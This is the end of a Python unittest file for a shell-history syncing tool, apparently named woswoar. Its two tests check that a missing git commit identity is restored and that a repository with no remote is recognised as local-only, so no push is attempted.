    def test_a_repo_missing_the_identity_gets_it_back(self) -> None:
        """Reading the config in one fork must not stop it being *written*.

        Without an identity, `commit` fails on a machine with no gitconfig --
        which is the machine woswoar is most likely to be installed on.
        """
        alpha = self.machine("alpha")
        with alpha.active():
            sync.git("config", "--unset", "user.name", check=False)
            sync.git("config", "--unset", "user.email", check=False)
            self.assertEqual(sync.read_repo().name, "")

            alpha.record("2023-11-14", 1_700_000_001, "git status")
            sync.run()
            self.assertEqual(sync.read_repo().name, sync.COMMIT_NAME)
            self.assertEqual(sync.read_repo().email, sync.COMMIT_EMAIL)
            self.assertIn(sync.COMMIT_NAME, sync.git("log", "-1", "--format=%an"))

    def test_a_repo_with_no_remote_is_seen_to_have_none(self) -> None:
        """The remote is now inferred from config keys rather than `git remote`.

        Getting that wrong in the optimistic direction would make a local-only
        repo try to push on every timer tick, and fail every time.
        """
        alpha = self.machine("alpha")
        with alpha.active():
            self.assertTrue(sync.read_repo().has_remote)
            sync.git("remote", "remove", "origin")
            self.assertFalse(sync.read_repo().has_remote)

            alpha.record("2023-11-14", 1_700_000_001, "git status")
            report = sync.run()
            self.assertEqual(report.chunks_written, 1)
            self.assertFalse(report.pushed)


if __name__ == "__main__":
    unittest.main()
